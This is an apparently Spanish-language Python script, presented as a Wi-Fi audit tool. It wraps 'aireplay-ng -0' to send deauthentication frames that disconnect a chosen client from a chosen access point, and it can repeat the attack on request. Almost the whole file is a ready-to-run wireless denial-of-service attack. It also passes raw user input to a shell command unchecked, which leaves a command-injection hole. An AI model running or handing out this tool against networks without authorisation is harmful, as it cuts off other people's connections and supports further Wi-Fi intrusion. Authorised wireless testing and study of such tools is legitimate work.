import subprocess
import os


os.system(f"clear")
nversion="1v1"
print(" #########################################################################  \n")
print("                          @FranckTscherig                                     ")
print("      SCRIPT PARA Desautenticar los clientes del AP seleccionado               ")
print(f"                       (AUDITORIA WIFI) {nversion}                          \n")
print(" #########################################################################  \n")

def ejecutar_comando(interfaz, bssid, station, numstation):
    comando = f"sudo aireplay-ng -0 {numstation} -a {bssid} -c {station} {interfaz}"
    
    try:
        print("Ejecutando el comando aireplay-ng...")
        subprocess.run(comando, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print("Error al ejecutar el comando aireplay-ng:")
        print(e)

while True:
    print(f"------------------                                           ")
    print(f"# Listando las interfaces Wi-Fi disponibles \n               ")
    # Mostrar las interfaces de red disponibles
    interfaces = subprocess.check_output(['iwconfig']).decode('utf-8')
    print("Interfaces de red disponibles:\n")
    print(interfaces)
    
    print(f"------------------                                       ")
    print(f"# Solicitando una interfaz Wi-Fi \n                      ")
    # Solicitar la interfaz de red al usuario
    interfaz = input("Ingresa el nombre de la interfaz de red (por ejemplo, wlan0mon): ")
    print(f"------------------                                       ")
    print(f"# Solicitando BSSID, STATION provenientes del script AuditoriWIFI.py \n    ")
    # Solicitar la dirección MAC del punto de acceso (BSSID) al usuario
    bssid = input("Ingresa la dirección MAC del punto de acceso (BSSID): ")

    # Solicitar la dirección MAC de la estación al usuario
    station = input("Ingresa la dirección MAC del dispositivo a desautenticar (STATION): ")
    print(f"------------------                                       ")
    print(f"# Solicitando número de intentos de desauntenticación \n    ")
    # Solicitar la cantidad de intentos de desautenticación del dispositivo STATION
    numstation = input("Ingresa la cantidad de intentos de desautenticación al STATION (ej 9): ")
    print(f"------------------                                       ")
    print(f"# Valores ingresados:                              \n    ")
    # Mostrar lo que se ingresó
    print(f"Interfaz: {interfaz}")
    print(f"BSSID: {bssid}")
    print(f"STATION: {station}")
    print(f"INTENTOS: {numstation}")
    print(f"------------------                                       ")
    print(f"# Solicitando confirmacion de ejecución de Desauntenticación               \n    ")
    # Preguntar si se desea ejecutar el comando
    ejecutar = input(f"\n¿Deseas ejecutar la desautenticación al dispositivo: {station}? (y/n): ")
    if ejecutar.lower() == "y":
        ejecutar_comando(interfaz, bssid, station, numstation)
    else:
        print("Comando no ejecutado.")

# Preguntar si se desea repetir el comando anterior, volver a iniciar el programa o salir
    while True:
        print(f"------------------                                       ")
        print(f"# Solicitando confirmacion para repeticion, nuevo inicio o salir del script       \n    ")
        opcion = input("\n¿Deseas repetir el comando (r), volver a iniciar el programa (i) o salir (s)? ")
        if opcion.lower() == "r":
            ejecutar_comando(interfaz, bssid, station, numstation)
        elif opcion.lower() == "i":
            break  # Volver a iniciar el programa
        elif opcion.lower() == "s":
            print("Proceso de desauntenticacion finalizado. Saliendo del script. Adios!")
            exit()  # Salir del programa
